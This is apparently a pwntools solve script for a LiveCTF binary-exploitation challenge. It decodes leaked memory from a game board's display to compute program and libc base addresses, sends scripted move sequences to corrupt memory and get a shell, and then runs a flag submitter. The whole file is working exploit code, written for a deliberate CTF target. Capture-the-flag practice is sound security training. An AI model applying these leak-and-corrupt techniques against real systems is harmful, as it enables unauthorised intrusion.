from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def run():
    global p
    p = remote(HOST, PORT)
    p.recvline()

    board = []
    for _ in range(32):
        board.append(p.recvline(keepends=False).decode())
        log.info(board[-1])

    if board[-10][1] == "o":
        log.error("bad state")
    if board[-10][3] == ".":
        log.error("bad state")
    if board[ -9][1] == "o":
        log.error("bad state")
    if board[ -9][3] == "o":
        log.error("bad state")

    if board[-12][3] == "o":
        log.error("bad state")
    if board[-12][1] == "o":
        log.error("bad state")
    if board[-11][31] == "o":
        log.error("bad state")
    if board[ -9][31] == "o":
        log.error("bad state")

    if board[-12][2] == "o":
        log.error("bad state")
        
    if board[-20][2] == "o":
        log.error("bad state")
    if board[-20][5] == "o":
        log.error("bad state")
    if board[-20][0] == "o":
        log.error("bad state")

    leaks = []
    for line in board:
        bits = ""
        for ch in line:
            if ch == "o":
                bits = "1" + bits
            else:
                bits = "0" + bits
        leaks.append(int(bits, 2))

    qwords = []
    for i in range(0, 32, 2):
        qwords.append((leaks[i] << 32) | (leaks[i + 1]))

    leak = qwords[6]
    log.info(f"{leak = :#x}")
    base = leak - 0x1274
    log.info(f"{base = :#x}")

    leak = qwords[10]
    libcbase = leak - 0x2a1ca
    log.info(f"{libcbase = :#x}")

    def move(moves: bytes):
        sane = b"wasd"
        orig = b"wars"
        new = bytes()
        for m in moves:
            new += p8(orig[sane.index(m)])
        p.sendline(new)

    state = move(b"wddddddddddsddddddddddddwddwwwwddddddd")
    state = move(b"a" * 30)
    state = move(b"w" * 4 + b"s" * 4)
    state = move(b"d" * 2 + b"w" * 4 + b"s" * 4)
    state = move(b"d" * 28 + b"w" * 5 + b"a" * 28)
    state = move(b"d" * 1 + b"w" * 2 + b"a" + b"s" * 4)
    state = move(b"w" * 3 + b"a" + b"s" * 2)
    state = move(b"w" * 4 + b"a" * 2 + b"w" * 5)
    state = move(b"d" * 31 + b"a" * 31 + b"d" * 2 + b"s" * 2 + b"w" * 2 + b"d" * 3 + b"s" * 2 + b"w" * 2)

    p.sendline(b"q")
    p.sendline(b"./submitter")
    flag = p.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)
    exit(0)

while True:
    try:
        run()
    except Exception:
        p.close()